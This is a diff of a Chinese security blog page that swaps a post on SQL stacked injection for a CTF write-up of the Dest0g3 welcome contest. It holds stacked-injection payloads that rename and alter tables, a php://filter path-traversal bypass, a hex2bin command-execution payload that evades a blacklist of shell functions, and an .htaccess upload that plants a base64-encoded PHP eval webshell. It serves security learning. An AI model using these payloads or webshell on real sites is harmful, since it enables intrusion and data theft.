@@ -25,7 +25,7 @@
 
   
 
-  <title>浅析sql-堆叠注入 | S@Kura</title>
+  <title>520迎新赛wp复现 | S@Kura</title>
 
   
 
@@ -48,7 +48,7 @@
 <!-- header container -->
 <header class="header-container post">
   
-    <div class="post-image" style="background-image: url(https://img.3dmgame.com/uploads/images/news/20190705/1562306781_697662.png)"></div>
+    <div class="post-image" style="background-image: url(https://m.media-amazon.com/images/M/MV5BODk5YWRjZTktY2RjZS00Y2MyLWIwNDktMmVkZDcwNTc5MjQzXkEyXkFqcGdeQXVyMzgxODM4NjM@._V1_.jpg)"></div>
   
 
   <!-- navbar -->
@@ -99,18 +99,18 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">浅析sql-堆叠注入</h1>
+          <h1 class="title-wrap">520迎新赛wp复现</h1>
           <h2 class="title-sub-wrap">
             <strong>S@Kura</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-08-14T11:33:57.000Z" itemprop="datePublished">2022-08-14</time>
+            <time  class="article-date" datetime="2022-08-28T11:47:05.000Z" itemprop="datePublished">2022-08-28</time>
           </h2>
           <ul class="wrap-list dark">
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/sql/">🏷️ sql</a></li>
+    <li><a href="/tags/wp/">🏷️ wp</a></li>
   
 </ul>
         </div>
@@ -134,48 +134,55 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>前几星期写题时遇见了好几道关于堆叠注入的题目，结果发现我对堆叠注入不是特别了解，所以写一下博客记录一下，但是发现堆叠注入使用的场景和条件好像有点苛刻。</p>
-<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;show databases; </span><br></pre></td></tr></table></figure>
-<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够。<br>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
-<h2 id="堆叠注入触发条件"><a href="#堆叠注入触发条件" class="headerlink" title="堆叠注入触发条件"></a>堆叠注入触发条件</h2><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，这就需要服务器在访问数据端时使用的是可同时执行多条sql语句的方法，例如php中的mysqli_multi_query函数。但与之相对应的mysqli_query()函数一次只能执行一条sql语句，所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p>
-<ul>
-<li>目标存在sql注入漏洞</li>
-<li>目标未对”;”号进行过滤</li>
-<li>目标中间层查询数据库信息时可同时执行多条sql语句</li>
-</ul>
-<h2 id="实例-强网杯-2019-随便注"><a href="#实例-强网杯-2019-随便注" class="headerlink" title="实例-[强网杯 2019]随便注"></a>实例-[强网杯 2019]随便注</h2><p><img src="https://img-blog.csdnimg.cn/cd470d5fbb2e452e82fa01837a765b8c.png"><br>输入1，页面返回正常；<br>输入1’ 页面报错了，加上注释符号#页面又回显正常，那么闭合符号就是单引号<br><img src="https://img-blog.csdnimg.cn/198039141eb946809631acd9ce4a516d.png"><br>然后进行正常的操作。</p>
-<p>判断列数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#   //回显正常</span><br><span class="line">1&#x27; order by 3#   //回显报错</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/5c3b00c0e66744b699e8aaaebfc811fb.png"><br>联合查询：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
-<p>发现过滤了很多函数。<br><img src="https://img-blog.csdnimg.cn/dba3672e56f949eebe79efe5cb268421.png"><br>尝试堆叠注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show databases;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/cc64c4180b2a4cdc96bd5174ee9021f9.png"><br>查表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show tables;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/b910c3f53cf541eab5fcf8dbec3f548f.png"><br>查询这两个表名中的列：<br></p>
-<p>注意：这里查询表名使用反单引号，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符。<br></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; show columns from &#x27;words&#x27;;#</span><br><span class="line">-1&#x27;; show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>
+        <h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h2><hr>
+<p><img src="https://img-blog.csdnimg.cn/6c9aaf9a0c4e40aa92eb5c771deacd35.png"></p>
+<p>放入 steg中观察</p>
+<p><img src="https://img-blog.csdnimg.cn/2aa6a714724f4d4298dea8c20e5806f9.png"></p>
+<p>发现password：Weak_Pas5w0rd<br>然后放入kali中binwalk发现含有zip</p>
+<p><img src="https://img-blog.csdnimg.cn/caeabf22f51f4210b2906812e4bbf166.png"></p>
+<p>然后foremost进行分离，因为在steg中知道了密码，所以直接拿到flag。</p>
+<h2 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h2><hr>
+<p>暴力破解得到一串字符<br><img src="https://img-blog.csdnimg.cn/f82de05b62e8410687b53c9639f2aed5.png"></p>
+<p> 摩斯密码解密</p>
+<p> <img src="https://img-blog.csdnimg.cn/a1d22cf33f51476f9871da236138c7ab.png"></p>
+<p> 然后hex转str</p>
+<p> <img src="https://img-blog.csdnimg.cn/4a3555a31c204ef981183b10f1df2348.png"></p>
+<p> 接着就是Unicode解密，最后base64得到flag。</p>
+<h2 id="你知道js吗"><a href="#你知道js吗" class="headerlink" title="你知道js吗"></a>你知道js吗</h2><p> 附件加上后缀.docx是一个word文档，转换字体后得到一段base64<br> <img src="https://img-blog.csdnimg.cn/63d8da4f6ff24b67b4faab8222512a44.png"></p>
+<p> 解码后发现 brainfuck</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class="line">-.-.- --.++ ++++.</span><br><span class="line">+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class="line">&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class="line">.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class="line">&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class="line"> +++++ .---- -.++. ++.+.</span><br><span class="line">--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- </span><br><span class="line">.+.-. ---.+ ++.+. -.+++</span><br><span class="line">+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class="line">-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class="line">.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class="line">+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class="line">.---- .+.++ ++.-- --.++</span><br><span class="line">++.-. ----. +.-.+ ++++. </span><br><span class="line">&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br></pre></td></tr></table></figure>
 
-<p> 在表1919810931114514中发现flag<br> <img src="https://img-blog.csdnimg.cn/8884d3fa4081450090331108b161917e.png"><br> 虽然我们已经找到了flag了，但是select被过滤了，而show命令又不能查看值。这就比较头疼了，不过如果仔细观察的话，一开始过滤的并没有alert 和 rename，我们已经知道了words是用来回显内容的，所以思路就是：我们把1919810931114514这个表更改名字为words,并增加相应的字段，使之回显原1919810931114514这个表的内容里面。</p>
-<blockquote>
-<ol>
-<li>将words的表名改成其它名字<br></li>
-<li>将1919810931114514表名改成”words”<br></li>
-<li>将flag列名改成id或者data<br></li>
-<li>在将这个新的words表插入一个列，即id或者data<br></li>
-</ol>
-</blockquote>
-<p>这里就要考验到我们对sql数据库的增删查改的能力了，当然我也不会，所以去网上搜一下。 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rename: 修改名字</span><br><span class="line">使用方法：rename table(修改的类型) tableA(待修改的表等) to tableB(重命名后的名字)</span><br><span class="line">alter：队列进行操作</span><br><span class="line">使用方法：alter table table[表名] add column[列名] type[数据类型] //(添加列)</span><br><span class="line">		alter table table[表名] change columnA[原列名] column[修改后列名] type[数据类型] //改变列名1</span><br><span class="line">		alter table table[表名] rename columnA[原列名] column[修改后列名]  //改变列名2，(不改变数据类型)</span><br><span class="line">		alter table table[表名] alter column column[列名] type[修改后的数据类型] //修改列的数据类型</span><br><span class="line">		alter table table[表名] drop column[列名] type[数据类型]  //删除表中的某一列</span><br><span class="line">		SQL限制条件：</span><br><span class="line">        alter table table[表名] modify column[列名] int not null  //是某一列不能存储null的字段</span><br><span class="line">        alter table table[表名] modify column[列名] int null     //解除对not null的限制</span><br><span class="line">        alter table table[表名] add column[列名] primary key (id) </span><br><span class="line">        //- NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。</span><br><span class="line">        alter table table[表名] add unique (id);</span><br><span class="line">        //增加unique约束。保证某列的每行必须有唯一的值。(注：可以有多个 UNIQUE 约束，只能有一个 PRIMARY KEY 约束)</span><br><span class="line">        alter table table[表名] add check (限制条件); //限制列的值得范围</span><br><span class="line">        alter table table[表名] alter column[列名] set default &#x27;默认值&#x27; //设置默认值，即未给列赋值时的默认值</span><br><span class="line">		alter table table[表名] add constraint ab_c default &#x27;默认值&#x27; for column[列名] //</span><br><span class="line">		alter table table[表名] add column[列名] auto_increment    //自动赋值，默认从1开始</span><br><span class="line">		alter table table[表名] add column[列名] foreign key //保证一个表中的数据匹配另一个表中的值的参照完整性</span><br></pre></td></tr></table></figure>
-<p>构造出payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>rename table words to word1</strong>; //将words表名更改为word1</li>
-<li><strong>rename table1919810931114514to words</strong>;//将1919810931114514表名改为words</li>
-<li><strong>alter table words change flag id varchar(100)</strong>; //将words表中的flag列改成数据类型为char(100)名字为data的新列</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/95b1da7ddb7a4fe99a51228cd537c67a.png"></p>
+<p><a target="_blank" rel="noopener" href="https://tool.bugku.com/brainfuck/?tdsourcetag=s_pctim_aiomsg"> Brainfuck/Text/Ook! obfuscator - deobfuscator. Decode and encode online. (bugku.com)</a>网站解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</span><br></pre></td></tr></table></figure>
+<p>hex转str得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">require_once &#x27;flag.php&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    require_once($_GET[&#x27;file&#x27;]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><s>require_once</s>在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含。</p>
+<p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<s>require_once(‘flag.php’)</s>，已经include的文件不可以再require_once。</p>
+<p><s>/proc/self</s>指向当前进程的<s>/proc/pid/</s>，<s>/proc/self/root/</s>是指向<s>/</s>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/e99d6467f8ae4eb18e8537c3602402ed.png"><br>base解密得到flag。</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
+<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;fl4g.php&quot;;</span><br><span class="line">$dest0g3 = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">$time = date(&quot;H&quot;);</span><br><span class="line">$timme = date(&quot;d&quot;);</span><br><span class="line">$timmme = date(&quot;i&quot;);</span><br><span class="line">if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123;</span><br><span class="line">    echo $fl4g;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Try harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(</span><br><span class="line">    function() use(&amp;$fl4g) &#123;</span><br><span class="line">        print $fl4g;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$fl4g .= $dest0g3;</span><br><span class="line">?&gt; Try harder!</span><br></pre></td></tr></table></figure>
+<p><s>date() </s>函数可把时间戳格式化为可读性更好的日期和时间。<br><s>set_error_handler()</s> 函数设置用户自定义的错误处理函数。该函数用于创建运行期间的用户自己的错误处理方法。所以思路就是POST传参，造成报错，执行<s>set_error_handler()</s> 函数，显示flag。<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/55237be98ae145b2a917401132fb3a1e.png"></p>
+<h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$aaa=$_POST[&#x27;aaa&#x27;];</span><br><span class="line">$black_list=array(&#x27;^&#x27;,&#x27;.&#x27;,&#x27;`&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&quot;&#x27;,&#x27;preg&#x27;,&#x27;&amp;&#x27;,&#x27;|&#x27;,&#x27;%0&#x27;,&#x27;popen&#x27;,&#x27;char&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;file&#x27;,&#x27;ascii&#x27;,&#x27;eval&#x27;,&#x27;replace&#x27;,&#x27;assert&#x27;,&#x27;exec&#x27;,&#x27;$&#x27;,&#x27;include&#x27;,&#x27;var&#x27;,&#x27;pastre&#x27;,&#x27;print&#x27;,&#x27;tail&#x27;,&#x27;sed&#x27;,&#x27;pcre&#x27;,&#x27;flag&#x27;,&#x27;scan&#x27;,&#x27;decode&#x27;,&#x27;system&#x27;,&#x27;func&#x27;,&#x27;diff&#x27;,&#x27;ini_&#x27;,&#x27;passthru&#x27;,&#x27;pcntl&#x27;,&#x27;proc_open&#x27;,&#x27;+&#x27;,&#x27;cat&#x27;,&#x27;tac&#x27;,&#x27;more&#x27;,&#x27;sort&#x27;,&#x27;log&#x27;,&#x27;current&#x27;,&#x27;\\&#x27;,&#x27;cut&#x27;,&#x27;bash&#x27;,&#x27;nl&#x27;,&#x27;wget&#x27;,&#x27;vi&#x27;,&#x27;grep&#x27;);</span><br><span class="line">$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);</span><br><span class="line">eval($aaa);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>命令执行，过滤了很多，没有过滤(和)还有%，同时 str_ireplace函数用hex2bin绕过，正好单引号没有过滤 73797374656d→system，636174202f666c6167→cat /flag。</p>
+<p>post传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa=hex2bin(&#x27;73797374656d&#x27;)(hex2bin(&#x27;636174202f666c6167&#x27;));</span><br></pre></td></tr></table></figure>
+<h2 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h2><hr>
+<p>前端JS有些白名单限制，直接利用插件或者其他办法禁用掉JS<br>上传过程中发现可以上传.htaccess文件，其次限制了文件后缀名，以及检查文件内容，过滤：&lt;?</p>
+<p>可以利用auto_append_file和php伪协议打组合拳绕过。</p>
+<p>先是.htaccess文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"> </span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=images.jpg&quot;</span><br></pre></td></tr></table></figure>
+<p>然后是images.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;images.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"> </span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</span><br><span class="line"># 上面是经过base64加密的 &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>最后蚁剑链接拿到flag。<br><img src="https://img-blog.csdnimg.cn/f826a2c3804e4e7cb0053a2e63a53a34.png"></p>
 
       </section>
 
@@ -183,32 +190,16 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="https://m.media-amazon.com/images/M/MV5BODk5YWRjZTktY2RjZS00Y2MyLWIwNDktMmVkZDcwNTc5MjQzXkEyXkFqcGdeQXVyMzgxODM4NjM@._V1_.jpg"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2022/08/28/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">520迎新赛wp复现</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
-      <div class="card-cover" background-image-lazy data-img="https://ts1.cn.mm.bing.net/th/id/R-C.2615bcd0ac66db7d8843e3a75fdcbe0b?rik=D6JpssrVxITSVQ&amp;riu=http%3a%2f%2fp18.qhimg.com%2fd%2f_open360%2f20140506%2f203.jpg&amp;ehk=3L4EskON97gfWOExWCIAUkYwv75Gwfo6%2fabAJ6fZjS4%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0"></div>
+      <div class="card-cover" background-image-lazy data-img="https://img.3dmgame.com/uploads/images/news/20190705/1562306781_697662.png"></div>
     
     <div class="card-text">
       
-        <a href="/2022/08/13/hello-world/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">Hello World</h2>
+        <a href="/2022/08/14/%E6%B5%85%E6%9E%90sql-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">浅析sql-堆叠注入</h2>
         </a>
       
       <div class="card-text--row">Older</div>
@@ -295,7 +286,7 @@
     <span>TOC</span>
   </div>
   <div class="widget-body">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">堆叠注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">堆叠注入触发条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">实例-[强网杯 2019]随便注</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pngenius"><span class="toc-number">1.</span> <span class="toc-text">Pngenius</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyEncode"><span class="toc-number">2.</span> <span class="toc-text">EasyEncode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E7%9F%A5%E9%81%93js%E5%90%97"><span class="toc-number">3.</span> <span class="toc-text">你知道js吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpdest"><span class="toc-number">4.</span> <span class="toc-text">phpdest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyPHP"><span class="toc-number">5.</span> <span class="toc-text">EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SimpleRCE"><span class="toc-number">6.</span> <span class="toc-text">SimpleRCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#funny-upload"><span class="toc-number">7.</span> <span class="toc-text">funny_upload</span></a></li></ol>
   </div>
 </section>
 
